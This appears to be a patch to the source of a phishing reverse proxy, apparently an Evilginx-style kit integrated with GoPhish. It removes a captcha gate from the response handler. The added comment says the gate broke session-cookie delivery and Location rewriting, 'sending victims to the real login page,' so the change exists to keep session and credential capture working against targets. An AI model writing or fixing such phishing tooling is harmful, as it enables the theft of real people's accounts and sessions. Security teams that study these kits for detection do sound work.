@@ -1042,17 +1042,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
                 }
             }
 
-            // TURNSTILE: block proxied upstream content until captcha is completed.
-            // Skip this gate for the initial lure redirect (LureRedirect=true) — that
-            // response is a synthetic 302 we generated, not upstream content, and we
-            // need the Location and session cookie to reach the client unchanged.
-            if p.turnstile && !ps.LureRedirect {
-                if s, ok := p.sessions[ps.SessionId]; ok {
-                    if !s.IsCaptchaDone {
-                        return resp
-                    }
-                }
-            }
+            // NOTE: Turnstile gating via the proxy response handler is NOT used here.
+            // For non-GoPhish flows IsCaptchaDone can never become true (it is only
+            // set by the /validate-captcha server endpoint reached via redirectTurnstile,
+            // which only fires when a GoPhish rid param is present). Gating here would
+            // permanently block Location-header rewriting and session-cookie delivery
+            // for all non-GoPhish sessions, sending victims to the real login page.
+            // Turnstile challenges are served correctly via the redirect-pages feature
+            // (ServeRedirectPage in the NonproxyHandler path).
 
             req_hostname := strings.ToLower(resp.Request.Host)
 
